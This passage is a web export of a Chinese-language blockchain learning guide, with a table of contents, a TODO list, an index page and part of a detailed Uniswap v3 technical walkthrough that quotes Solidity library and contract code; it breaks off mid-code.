mindcarver。\n\n\n📖 目录\n\n📚 区块链基础\n⛓️ 公链开发\n🎨 DApp 开发\n⚡ Layer2 解决方案\n🔐 隐私计算\n🔗 跨链技术\n📦 去中心化存储\n🧭 学习路线与资源\n🤝 如何贡献\n\n\n📚 区块链基础 (Blockchain Basics)\n万丈高楼平地起，这里是您进入区块链世界的第一站。\n\n\n\n\n\n\n\n\n\n\n\n\n\n主题描述纠删码分布式存储中的数据冗余与恢复技术\n\n⛓️ 公链开发 (Public Chain Development)\n深入探索公链的底层技术，包括共识机制、密码学、P2P网络等核心组件。\n🔧 共识机制 (Consensus Mechanisms)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n文档描述死磕共识算法_POW算法工作量证明机制详解死磕共识算法_POS算法权益证明机制详解死磕共识算法_DPOS算法委托权益证明机制死磕共识算法_EOS_DPOS_BFT算法EOS的混合共识机制死磕共识算法_Paxos算法分布式一致性算法死磕共识算法_Raft算法易于理解的一致性算法死磕共识算法_拜占庭将军问题拜占庭容错基础理论死磕共识算法_PBFT算法实用拜占庭容错算法死磕共识算法_Istanbul BFT算法以太坊的IBFT共识\n🔐 密码学 (Cryptography)\n\n点击展开详细内容\n基础理论\n\n密码学基础\n数论基础 / 代数基础\n\n椭圆曲线密码学\n\n椭圆曲线理论与应用\n\n签名算法\n\nBLS签名算法\n多种数字签名方案\n\n隐私计算\n\nVRF (可验证随机函数)\nVDF (可验证延迟函数)\n\n\n🌐 P2P 网络 (P2P Network)\n\nlibp2p 源码分析\nP2P 网络协议详解\n\n🔬 公链研究 (Public Chain Research)\n\n点击展开详细内容\n以太坊 (Ethereum)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n分类内容源码分析以太坊核心模块源码解读、P2P网络分析基础理论以太坊基础概念、钱包系列开发资料ERC标准整理、开发者资源汇总安全性以太坊安全机制研究生态应用应用整理、生态分析\nCosmos 生态\n\nCosmos SDK 源码分析\nCometBFT 共识引擎\nIBC 跨链通信协议\nTendermint 核心\n\nTON (The Open Network)\n\nTON 开发指南\nTON 技术资料\n\n其他公链\n\nHyperledger Fabric (联盟链)\n\n\n📊 其他专题\n\n布隆过滤器\nRawDB 数据库\n数据可用性 (DA) 探索\n\n\n🎨 DApp 开发 (DApp Development)\n学习如何构建去中心化应用，从智能合约开发到安全审计的完整流程。\n📝 智能合约基础\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n主题描述Solidity callcall 函数详解Solidity delegatecall委托调用机制Solidity staticcall静态调用Solidity callcodecallcode 用法CREATE2可预测地址的合约部署Selector函数选择器Fallback 和 Receive回退函数机制元交易无 Gas 交易实现\n🚀 合约高级技巧\n\n点击展开详细内容\n核心技巧\n\n死磕 Solidity 之内存布局\n死磕 Solidity 之如何有效节省 Gas\n死磕 Solidity 之可迭代映射\n死磕 Solidity 之编写可升级合约\n死磕 CREATE2 控制合约地址\n合约升级实战\n事件高级用法\n\n设计模式\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n类别模式可维护性Contract Registry、Contract Relay、数据逻辑分离安全性Mutex、Rate Limit、Speed Bump、安全转账生命周期允许合约自动停止、允许合约自毁\n\n📋 EIP/ERC 标准\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n标准描述EIP-712类型化结构化数据签名EIP-1559交易费用市场改革EIP-2718类型化交易信封ERC-1167最小代理合约ERC-1967代理存储槽标准ERC-2535钻石标准 (多面代理)ERC-4337账户抽象\n🛡️ 安全审计\n\n点击展开详细内容\n常见漏洞\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n漏洞类型描述重入攻击递归调用攻击重放攻击交易重复执行算法上下溢出整数溢出问题权限控制漏洞访问控制缺陷短地址攻击参数截断攻击拒绝服务攻击DoS 攻击提案攻击治理攻击隐私数据泄露链上数据可见性\n\n💰 DeFi 应用场景\n\n点击展开详细内容\nUniswap V2\n\n概念介绍\nFactory 合约\nPair 合约\nRouter02 合约\n部署指南\n\nAAVE\n\nAAVE 原理\n\n其他\n\n永续期货合约\n动态 NFT\n数字版权保护\n\n\n\n⚡ Layer2 解决方案 (Layer2 Solutions)\nLayer2 是解决区块链扩展性问题的关键技术方案。\nOptimistic Rollup\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n项目内容OptimismSpec 分析、源码分析 (op-node)Arbitrum技术架构与实现\nZK Rollup\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n项目内容Polygon zkEVMZK 证明系统与 EVM 兼容ZK Rollup 通用零知识证明在 Rollup 中的应用\n其他方案\n\nCelestia - 模块化数据可用性层\nRollkit - 主权 Rollup 框架\nB2 Network - 比特币 Layer2\nBTC Layer2 - 比特币二层方案研究\n\n\n🔐 隐私计算 (Privacy Computing)\n隐私保护是区块链技术的重要组成部分。\n零知识证明 (Zero-Knowledge Proofs)\n\nZK 资料整理与学习路径\n\n安全多方计算 (Secure Multi-Party Computation)\n\nMPC 协议与应用场景\n\n\n🔗 跨链技术 (Cross-Chain Technology)\n打破链与链之间的孤岛，实现价值和信息的自由流通。\n跨链方案概览\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n文档描述跨链主流技术概览主流跨链技术对比分析跨链 HTLC哈希时间锁定合约BLS 算法BLS 签名在跨链中的应用\n跨链桥项目\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n项目描述桥概念跨链桥基础原理Arbitrum BridgeArbitrum 官方桥Optimism GatewayOptimism 官方桥Polygon BridgePolygon 官方桥cBridgeCeler 跨链桥Hop ProtocolHop 协议MultichainMultichain 跨链Connext ProtocolConnext 跨链协议\n\n📦 去中心化存储 (Decentralized Storage)\n探索去中心化存储方案，构建真正去中心化的互联网。\nIPFS\n\nIPFS 学习要点\nlibp2p 协议详解\n\nFileCoin\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n文档描述FileCoin 技术文档技术架构与实现死磕 FileCoin 经济模型经济激励机制分析\n\n🧭 学习路线与资源 (Learning Roadmaps &amp; Resources)\n我们为您精心规划了从初阶到高阶的学习路线图。\n📍 学习路线图\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n阶段文件初阶死磕区块链_初阶学习路线图.xmind中阶死磕区块链_中阶学习路线图.xmind高阶死磕区块链_高阶学习路线图.xmind\n📚 学习资料\n\n相关学习资料汇总 (持续更新)\n智能合约学习路线与资源汇总\n\n\n🗂️ 项目结构\nblockchainguide/\n├── Blockchain_Basics/          # 区块链基础\n├── Public_Chain_Development/   # 公链开发\n│   ├── Consensus_Mechanisms/   # 共识机制\n│   ├── Cryptography/           # 密码学\n│   ├── P2P_Network/            # P2P 网络\n│   └── Public_Chain_Research/  # 公链研究 (ETH/Cosmos/TON)\n├── DApp_Development/           # DApp 开发\n│   ├── 合约基础/               # Solidity 基础\n│   ├── 合约高级技巧/           # 高级技巧与设计模式\n│   ├── eip/                    # EIP/ERC 标准\n│   ├── 安全审计/               # 安全审计与漏洞\n│   └── 应用场景/               # DeFi/NFT 应用\n├── Layer2_Solutions/           # Layer2 方案\n├── Privacy_Computing/          # 隐私计算 (ZK/MPC)\n├── Cross_Chain_Technology/     # 跨链技术\n├── Decentralized_Storage/      # 去中心化存储 (IPFS/FileCoin)\n└── Learning_Roadmaps_And_Resources/  # 学习路线与资源\n\n\n🤝 如何贡献\n非常欢迎您为本知识库做出贡献！您可以通过以下方式参与：\n\n🐛 修正错误：如果您发现任何错误或过时的内容，请随时提交 Pull Request\n📝 补充内容：如果您有好的学习资料或文章，欢迎分享给我们\n💡 提出建议：如果您对本知识库有任何建议，请通过 Issue 告诉我们\n⭐ Star 支持：如果觉得有帮助，请给我们一个 Star\n\n贡献指南\n# 1. Fork 本仓库\n# 2. 创建您的特性分支\ngit checkout -b feature/AmazingFeature\n \n# 3. 提交您的更改\ngit commit -m &#039;Add some AmazingFeature&#039;\n \n# 4. 推送到分支\ngit push origin feature/AmazingFeature\n \n# 5. 打开一个 Pull Request\n\n📜 License\n本项目采用 MIT 许可证 - 查看 LICENSE 文件了解详情\n\n\n让我们一起，死磕到底，共同打造最顶级的区块链技术学习资源！\n\n\n"},"blockchainguide/TODO":{"slug":"blockchainguide/TODO","filePath":"blockchainguide/TODO.md","title":"TODO","links":[],"tags":[],"content":"\n BLS12-381\n eip1559\n 账户抽象话EIP-4337（最新草案）\n\n多签安全\n智能合约钱包VSMPC钱包\n基于社交与时间的钱包恢复\n地址黑白名单\n无需g a s费用的元交易和批量交易\nGnosis Safe多签\n\n\n 自定义EVM指令实现业务逻辑\n Libp2p\n\n密码学\n\n Schnorr签名\n VDF\n"},"blockchainguide/index":{"slug":"blockchainguide/index","filePath":"blockchainguide/index.md","title":"区块链技术指南","links":["blockchainguide/Blockchain_Basics/","blockchainguide/Public_Chain_Development/","blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/","blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊基础理论部分/","blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/","blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/","blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/ibc/","blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/","blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/","blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/","blockchainguide/Public_Chain_Development/Cryptography/","blockchainguide/Public_Chain_Development/P2P_Network/","blockchainguide/Public_Chain_Development/Consensus_Mechanisms/","blockchainguide/DApp_Development/","blockchainguide/DApp_Development/应用场景/defi/","blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/","blockchainguide/DApp_Development/应用场景/defi/uniswap/v3/","blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/","blockchainguide/DApp_Development/应用场景/defi/pancake/v3/","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/","blockchainguide/DApp_Development/应用场景/nft/","blockchainguide/Layer2_Solutions/","blockchainguide/Layer2_Solutions/layer2/optimism/","blockchainguide/Layer2_Solutions/layer2/zkroullup/","blockchainguide/Layer2_Solutions/layer2/arbitrum/","blockchainguide/Layer2_Solutions/layer2/celestia/","blockchainguide/Layer2_Solutions/layer2/rollkit/","blockchainguide/Layer2_Solutions/btclayer2/","blockchainguide/Cross_Chain_Technology/","blockchainguide/Cross_Chain_Technology/跨链方案/","blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/","blockchainguide/Decentralized_Storage/","blockchainguide/Privacy_Computing/","blockchainguide/Learning_Roadmaps_And_Resources/"],"tags":["区块链","Solidity","DeFi","Layer2"],"content":"区块链技术指南\n\n系统学习区块链技术，从基础概念到高级应用\n\n\n📚 学习路径\n区块链基础\n入门必读：理解区块链的核心概念和基础理论。\n\n区块链基础\n\n公链开发\n深入研究：从架构到实现，掌握主流公链的开发技术。\n\n公链开发总览\n\n以太坊：源码分析、基础理论、P2P网络\nCosmos：SDK开发、IBC跨链、CometBFT\nHyperledger Fabric：企业级区块链\nTON：高性能公链\n\n\n\n核心技术：\n\n\n密码学\n\n椭圆曲线、签名算法\n零知识证明、VRF、VDF\n安全多方计算\n数论基础\n\n\n\nP2P网络\n\nLibp2p源码分析\nP2P网络设计\n\n\n\n共识机制\n\nPoW、PoS\nPBFT、Raft\nBFT协议\n\n\n\nDApp开发\n实践应用：智能合约开发和DeFi应用构建。\n\nDApp开发总览\n\n合约基础：Solidity语法、合约开发\n高级技巧：设计模式、安全最佳实践\n安全审计：常见漏洞、安全分析方法\nEVM：账户抽象（ERC4337）\nEIP标准：ERC标准、协议提案\n\n\n\n应用场景：\n\n\nDeFi\n\nUniswap：V2、V3、V4\nPancakeSwap：V3、V4\nAave：借贷协议详解\n\n\n\nNFT\n\nERC-721、ERC-1155标准\nNFT应用开发\n\n\n\nLayer2解决方案\n扩容技术：提升区块链性能的Layer2技术。\n\nLayer2总览\n\nOptimistic Rollup：\n\nOptimism：源码分析、协议规范\n\n\nZK-Rollup：\n\nzkRollup\n[Polygon zkEVM](/blockchainguide/Layer2_Solutions/layer2/Polygon zkevm/)\n\n\n其他解决方案：\n\nArbitrum\nCelestia - 数据可用性\nRollkit\nBitcoin Layer2\n\n\n\n\n\n跨链技术\n互联互通：不同区块链之间的桥梁。\n\n跨链技术总览\n\n跨链方案\n跨链桥\nHTLC、IBC、Optimistic Transfer\n\n\n\n去中心化存储\n存储革命：去中心化的存储解决方案。\n\n去中心化存储总览\n\nIPFS：星际文件系统\nFileCoin：去中心化存储网络\n\n\n\n隐私计算\n隐私保护：区块链中的隐私保护技术。\n\n隐私计算总览\n\n零知识证明：ZK技术详解\n安全多方计算：MPC协议\n\n\n\n学习路线图\n系统学习：从入门到精通的学习路径。\n\n学习路线和资源\n\n初阶学习路线\n中阶学习路线\n高阶学习路线\n\n\n\n\n🎯 推荐学习顺序\n初学者路径\n区块链基础 → 智能合约基础 → 简单DApp开发 → DeFi应用\n\n适合：刚接触区块链的开发者\n进阶路径\n公链架构研究 → Layer2技术 → 跨链技术 → 隐私计算\n\n适合：有一定基础，想深入研究\n深度研究\n源码分析 → 协议设计 → 安全审计 → 创新项目\n\n适合：从事区块链核心开发\n\n💡 学习建议\n循序渐进\n从基础概念开始，逐步深入到实际应用和源码分析。\n动手实践\n多写合约，多部署应用，在实践中学习。\n关注安全\n智能合约安全非常重要，学习常见漏洞和防范方法。\n跟进前沿\n区块链技术发展迅速，持续关注新技术和协议。\n\n📖 推荐资源\n书籍\n\n《精通比特币》\n《以太坊技术详解与实战》\n《智能合约开发实战》\n\n官方文档\n\nEthereum.org\nSolidity文档\nOpenZeppelin\n\n开发工具\n\nHardhat：以太坊开发环境\nRemix：在线IDE\nOpenZeppelin：安全合约库\n\n\n\n  🚀 开始你的区块链学习之旅\n  从基础概念到高级应用，系统掌握区块链技术\n  \n    从基础开始\n    DApp开发\n    Layer2技术\n  \n\n\n\n  持续更新中，欢迎收藏和分享！\n"},"blockchainguide/未命名":{"slug":"blockchainguide/未命名","filePath":"blockchainguide/未命名.md","title":"未命名","links":[],"tags":[],"content":""},"blockchainguide/死磕-uniswap--v3":{"slug":"blockchainguide/死磕-uniswap--v3","filePath":"blockchainguide/死磕 uniswap -v3.md","title":"死磕 uniswap -v3","links":[],"tags":[],"content":"死磕uniswap-v3\n概述与核心创新\nUniswap v3的革命性变革\nUniswap v3不仅仅是一个简单的协议升级，而是对去中心化金融(DeFi)流动性概念的根本性重构。它解决了困扰AMM(自动化做市商)领域已久的资本效率问题，通过引入集中流动性(Concentrated Liquidity)概念，实现了高达4000倍的资本效率提升。\n技术演进的历史背景\n第一代AMM的局限：\n传统的恒定乘积公式 x × y = k 存在根本性缺陷：\n\n流动性在整个价格曲线上均匀分布\n大部分流动性永远不会被交易使用\n资本利用率极低，通常只有1-5%\n无法为LP提供精确的价格控制\n\n第二代的改进：\nUniswap v2引入了一些改进：\n\n任意ERC20代币对\n协议费用机制\nFlash Swap功能\n更好的价格预言机\n\n第三代的革命：\nUniswap v3彻底重新设计了流动性提供机制：\n\n集中流动性允许LP选择特定价格区间\n多级费用结构适应不同风险级别\n非同质化流动性代币(NFT LP Token)\n高级预言机系统\n无损失的临时流动性(Just-in-Time Liquidity)\n\n集中流动性的数学基础\n传统AMM公式的问题在于假设所有价格区间都同等重要：\n传统公式：x × y = k\n问题：流动性在[0, ∞]范围内均匀分布\n\nUniswap v3引入了区间化的恒定乘积公式：\n集中流动性公式：\n在价格区间[pa, pb]内：\n(x + L/√pb) × (y + L×√pa) = L²\n\n其中：\n- L: 流动性常数\n- pa: 价格下界  \n- pb: 价格上界\n- x, y: 代币的虚拟储备量\n\n这个公式的精妙之处：\n\n区间内等效：在[pa, pb]区间内表现如传统AMM\n区间外失效：价格超出区间时流动性自动失效\n资本集中：所有流动性集中在有效价格区间\n灵活配置：LP可自由选择价格区间\n\nTick机制的创新设计\nTick是Uniswap v3的另一个重要创新，将连续的价格空间离散化：\n价格与Tick的关系：\nprice = 1.0001^tick\n\n每个tick代表0.01%的价格变化\n最小tick = -887272 (对应最小价格)\n最大tick = 887272 (对应最大价格)\n\nTick设计的优势：\n\n精确价格控制：0.01%的粒度足够精细\n计算效率：整数运算替代浮点运算\n存储优化：紧凑的价格表示\n范围管理：简化区间计算\n\n// Tick到价格的转换核心逻辑\nfunction getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {\n    uint256 absTick = tick &lt; 0 ? uint256(-int256(tick)) : uint256(int256(tick));\n    require(absTick &lt;= uint256(MAX_TICK), &#039;T&#039;);\n \n    // 二进制分解算法\n    uint256 ratio = absTick &amp; 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;\n    if (absTick &amp; 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) &gt;&gt; 128;\n    // ... 更多位运算\n    \n    if (tick &gt; 0) ratio = type(uint256).max / ratio;\n    sqrtPriceX96 = uint160((ratio &gt;&gt; 32) + (ratio % (1 &lt;&lt; 32) == 0 ? 0 : 1));\n}\n架构设计的工程学考量\n单例工厂模式的深度应用\nUniswap v3采用了工厂模式统一管理所有池子合约\ncontract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall {\n    address public override owner;\n    \n    // 三层嵌套映射确保唯一性\n    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;\n    \n    // 费率与tick间距的绑定\n    mapping(uint24 =&gt; int24) public override feeAmountTickSpacing;\n    \n    constructor() {\n        owner = msg.sender;\n        emit OwnerChanged(address(0), msg.sender);\n        \n        // 预设标准费率等级\n        feeAmountTickSpacing[500] = 10;    // 0.05% fee, 10 tick spacing\n        feeAmountTickSpacing[3000] = 60;   // 0.30% fee, 60 tick spacing\n        feeAmountTickSpacing[10000] = 200; // 1.00% fee, 200 tick spacing\n    }\n}\n工厂模式的优势分析：\n\n统一管理：所有池子的创建都经过工厂合约\n参数验证：在创建时进行完整性检查\n地址计算：可预测的池子地址便于前端集成\n权限控制：只有owner可以添加新的费率等级\n事件监听：统一的事件源便于索引\n\n地址排序的重要性\n代币地址排序是一个看似简单但极其重要的设计决策：\nfunction createPool(address tokenA, address tokenB, uint24 fee) \n    external override noDelegateCall returns (address pool) {\n    require(tokenA != tokenB);\n    \n    // 关键：地址排序确保唯一性\n    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n    require(token0 != address(0));\n    \n    int24 tickSpacing = feeAmountTickSpacing[fee];\n    require(tickSpacing != 0);\n    require(getPool[token0][token1][fee] == address(0));\n    \n    pool = deploy(address(this), token0, token1, fee, tickSpacing);\n    \n    // 双向映射优化查询\n    getPool[token0][token1][fee] = pool;\n    getPool[token1][token0][fee] = pool;\n    \n    emit PoolCreated(token0, token1, fee, tickSpacing, pool);\n}\n地址排序的深层意义：\n\n唯一性保证：相同代币对只能有一个池子（在特定费率下）\n查询优化：无论查询顺序如何都能找到正确池子\n存储效率：避免重复存储相同的池子\n前端友好：简化前端的池子查找逻辑\n\n费率与Tick间距的精妙绑定\n不同费率对应不同tick间距的设计有深刻的数学和经济学考量：\n费率等级设计：\n0.05% (500) → tick间距 10  → 0.10% 最小价格变化\n0.30% (3000) → tick间距 60 → 0.60% 最小价格变化  \n1.00% (10000) → tick间距 200 → 2.00% 最小价格变化\n\n设计原理：\n\n稳定币对：需要极细的价格粒度，使用最小tick间距\n主流币对：中等粒度平衡gas效率和精度\n高风险币对：粗粒度降低gas成本，适应高波动性\n\nfunction enableFeeAmount(uint24 fee, int24 tickSpacing) public override {\n    require(msg.sender == owner);\n    require(fee &lt; 1000000); // 最大100%费率\n    \n    // tick间距限制的数学原因\n    require(tickSpacing &gt; 0 &amp;&amp; tickSpacing &lt; 16384);\n    require(feeAmountTickSpacing[fee] == 0);\n    \n    feeAmountTickSpacing[fee] = tickSpacing;\n    emit FeeAmountEnabled(fee, tickSpacing);\n}\ntick间距限制的数学原因：\n\n16384 tick = 1.0001^16384 ≈ 5倍价格变化\n防止TickBitmap溢出int24容器\n平衡精度与gas效率\n\n架构设计深度剖析\n合约层次结构的精密设计\n继承关系\nUniswap v3的合约继承结构体现了面向对象设计的最佳实践：\n// 工厂合约的多重继承\ncontract UniswapV3Factory is \n    IUniswapV3Factory,      // 接口定义\n    UniswapV3PoolDeployer,  // 部署逻辑\n    NoDelegateCall          // 安全机制\n{\n    // 工厂核心逻辑\n}\n \n// 池子合约的复杂继承\ncontract UniswapV3Pool is \n    IUniswapV3Pool,         // 组合接口\n    NoDelegateCall          // 安全基类\n{\n    // 池子核心逻辑\n}\n \n// 接口的模块化组合\ninterface IUniswapV3Pool is\n    IUniswapV3PoolImmutables,    // 不可变属性\n    IUniswapV3PoolState,         // 状态变量\n    IUniswapV3PoolDerivedState,  // 派生状态\n    IUniswapV3PoolActions,       // 用户操作\n    IUniswapV3PoolOwnerActions,  // 管理员操作\n    IUniswapV3PoolEvents         // 事件定义\n{\n    // 空接口，纯组合\n}\nPool合约的状态管理\nPool合约的状态管理是整个系统的核心，采用了高度优化的存储布局：\ncontract UniswapV3Pool {\n    // 核心状态变量的精密打包\n    struct Slot0 {\n        uint160 sqrtPriceX96;              // 当前价格√P (Q64.96)\n        int24 tick;                        // 当前tick\n        uint16 observationIndex;           // 观察者数组当前索引\n        uint16 observationCardinality;     // 观察者数组当前容量\n        uint16 observationCardinalityNext; // 观察者数组目标容量\n        uint8 feeProtocol;                 // 协议费率 (4位+4位)\n        bool unlocked;                     // 重入保护锁\n    } // 总计：20+3+2+2+2+1+1 = 31字节，完美契合32字节存储槽\n    \n    Slot0 public override slot0;\n    \n    // 全局费用增长累积器\n    uint256 public override feeGrowthGlobal0X128; // token0的全局费用增长率\n    uint256 public override feeGrowthGlobal1X128; // token1的全局费用增长率\n    \n    // 协议费用累积\n    struct ProtocolFees {\n        uint128 token0; // 协议累积的token0费用\n        uint128 token1; // 协议累积的token1费用\n    }\n    ProtocolFees public override protocolFees;\n    \n    // 当前有效流动性\n    uint128 public override liquidity;\n    \n    // 核心数据结构映射\n    mapping(int24 =&gt; Tick.Info) public override ticks;           // tick信息\n    mapping(int16 =&gt; uint256) public override tickBitmap;        // tick位图\n    mapping(bytes32 =&gt; Position.Info) public override positions; // 位置信息\n    Oracle.Observation[65535] public override observations;      // 观察者数组\n}\n\n存储槽优化：Slot0将多个变量打包到单个存储槽，每次读取只需2100 gas\n费用累积器：使用全局累积器而非按位置计算，大幅降低gas成本\n观察者数组：固定大小避免动态数组的存储开销\n位图压缩：tick位图用位操作实现高效的tick查找\n\nLibrary模式的深度应用\nv3大量使用library实现代码复用和gas优化：\n// TickMath库：处理tick与价格的转换\nlibrary TickMath {\n    int24 internal constant MIN_TICK = -887272;\n    int24 internal constant MAX_TICK = -MIN_TICK;\n    \n    uint160 internal constant MIN_SQRT_RATIO = 4295128739;\n    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;\n    \n    // 核心转换函数\n    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96);\n    function getTickAtSqrtRatio(uint160 sqrtPriceX96) internal pure returns (int24 tick);\n}\n \n// SwapMath库：处理交换过程的数学计算\nlibrary SwapMath {\n    function computeSwapStep(\n        uint160 sqrtRatioCurrentX96,\n        uint160 sqrtRatioTargetX96,\n        uint128 liquidity,\n        int256 amountRemaining,\n        uint24 feePips\n    ) internal pure returns (\n        uint160 sqrtRatioNextX96,\n        uint256 amountIn,\n        uint256 amountOut,\n        uint256 feeAmount\n    );\n}\n \n// Position库：处理流动性位置管理\nlibrary Position {\n    using FullMath for uint256;\n    using FixedPoint128 for uint256;\n    \n    struct Info {\n        uint128 liquidity;                    // 流动性数量\n        uint256 feeGrowthInside0LastX128;    // 上次记录的内部费用增长\n        uint256 feeGrowthInside1LastX128;    // 上次记录的内部费用增长\n        uint128 tokensOwed0;                 // 欠付的token0\n        uint128 tokensOwed1;                 // 欠付的token1\n    }\n    \n    function get(mapping(bytes32 =&gt; Info) storage self, address owner, int24 tickLower, int24 tickUpper)\n        internal view returns (Position.Info storage position);\n        \n    function update(Info storage self, int128 liquidityDelta, uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) \n        internal;\n}\nLibrary设计的技术优势：\n\n代码复用：同样的数学逻辑被多个合约使用\nGas优化：库函数在编译时内联，避免外部调用开销\n安全性：核心数学逻辑集中维护，降低错误风险\n模块化：功能分离便于测试和审计\n升级性：可通过代理模式实现逻辑升级\n\n数据结构的精妙设计\nTick数据结构的深度剖析\nlibrary Tick {\n    struct Info {\n        uint128 liquidityGross;                    // 此tick的总流动性\n        int128 liquidityNet;                       // 跨越此tick时的流动性变化\n        uint256 feeGrowthOutside0X128;            // tick外部的token0费用增长\n        uint256 feeGrowthOutside1X128;            // tick外部的token1费用增长\n        int56 tickCumulativeOutside;              // tick外部的累积tick值\n        uint160 secondsPerLiquidityOutsideX128;   // tick外部的每流动性秒数\n        uint32 secondsOutside;                    // tick外部的累积秒数\n        bool initialized;                         // 是否已初始化\n    }\n}\nliquidityNet的巧妙设计：\nliquidityNet的符号表示方向：\n\n正值：从左向右跨越时增加流动性\n负值：从左向右跨越时减少流动性\n\n这种设计使得tick跨越时的流动性更新变得极其高效：\nfunction cross(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tick,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128,\n    uint160 secondsPerLiquidityCumulativeX128,\n    int56 tickCumulative,\n    uint32 time\n) internal returns (int128 liquidityNet) {\n    Tick.Info storage info = self[tick];\n    \n    // &quot;翻转&quot;技巧：将outside值变为inside值\n    info.feeGrowthOutside0X128 = feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;\n    info.feeGrowthOutside1X128 = feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;\n    info.secondsPerLiquidityOutsideX128 = secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;\n    info.tickCumulativeOutside = tickCumulative - info.tickCumulativeOutside;\n    info.secondsOutside = time - info.secondsOutside;\n    \n    liquidityNet = info.liquidityNet;\n}\n“翻转”技巧的数学原理：\n当价格跨越tick时，“外部”和”内部”的概念发生翻转。通过简单的减法操作，原来的outside值就变成了新的outside值，这是一个非常巧妙的数学技巧。\nPosition数据结构的费用跟踪机制\nstruct Position.Info {\n    uint128 liquidity;                     // 此位置的流动性数量\n    uint256 feeGrowthInside0LastX128;     // 上次更新时的内部费用增长率\n    uint256 feeGrowthInside1LastX128;     // 上次更新时的内部费用增长率\n    uint128 tokensOwed0;                  // 累积的未领取token0费用\n    uint128 tokensOwed1;                  // 累积的未领取token1费用\n}\n费用计算的核心算法：\nfunction update(\n    Info storage self,\n    int128 liquidityDelta,\n    uint256 feeGrowthInside0X128,\n    uint256 feeGrowthInside1X128\n) internal {\n    Info memory _self = self;\n    \n    // 计算自上次更新以来的费用增长\n    uint128 tokensOwed0 = uint128(\n        FullMath.mulDiv(\n            feeGrowthInside0X128 - _self.feeGrowthInside0LastX128, // 费用增长差值\n            _self.liquidity,                                        // 流动性数量\n            FixedPoint128.Q128                                      // 归一化因子\n        )\n    );\n    \n    // 更新流动性\n    if (liquidityDelta != 0) {\n        self.liquidity = LiquidityMath.addDelta(_self.liquidity, liquidityDelta);\n    }\n    \n    // 更新费用增长记录点\n    self.feeGrowthInside0LastX128 = feeGrowthInside0X128;\n    self.feeGrowthInside1LastX128 = feeGrowthInside1X128;\n    \n    // 累积欠付费用\n    if (tokensOwed0 &gt; 0 || tokensOwed1 &gt; 0) {\n        self.tokensOwed0 += tokensOwed0;\n        self.tokensOwed1 += tokensOwed1;\n    }\n}\n费用计算的数学原理：\n费用计算基于”费用增长率”概念：\n应得费用 = (当前费用增长率 - 上次记录的费用增长率) × 流动性数量\n\n这种设计的优势：\n\nO(1)时间复杂度：无论时间间隔多长，计算复杂度都是常数\n精确累积：避免复合计算中的精度损失\n存储高效：只存储差值而非绝对值\n自动更新：每次流动性变化时自动更新费用\n\n数学模型与算法核心原理\n数学模型与算法核心原理\n定点数数学系统的深度解析\nQ64.96格式的数学基础与设计考量\nUniswap v3采用Q64.96定点数格式存储价格的平方根，这个选择背后有深刻的数学和工程考量：\nQ64.96格式详解：\n- 总位数：160位 (正好适配uint160)\n- 整数部分：64位 (2^64 ≈ 1.84 × 10^19)\n- 小数部分：96位 (精度 2^(-96) ≈ 1.26 × 10^(-29))\n- 表示范围：[0, 2^64)\n- 最小正值：2^(-96)\n\n为什么选择平方根价格而不是直接价格？\n\n数值稳定性：价格可能存在极值，平方根更平稳\n计算便利性：AMM公式大量涉及平方根运算\n精度优化：相同位宽下平方根能表示更大范围\n溢出防护：减少乘法运算中的溢出风险\n\n// 价格平方根的实际应用\ncontract PriceExample {\n    // 直接存储价格的问题\n    uint256 price = 1000000000000000000; // 1 ETH = 1 DAI，但占用更多位\n    \n    // 使用平方根价格的优势\n    uint160 sqrtPriceX96 = 79228162514264337593543950336; // √1 * 2^96\n    \n    // 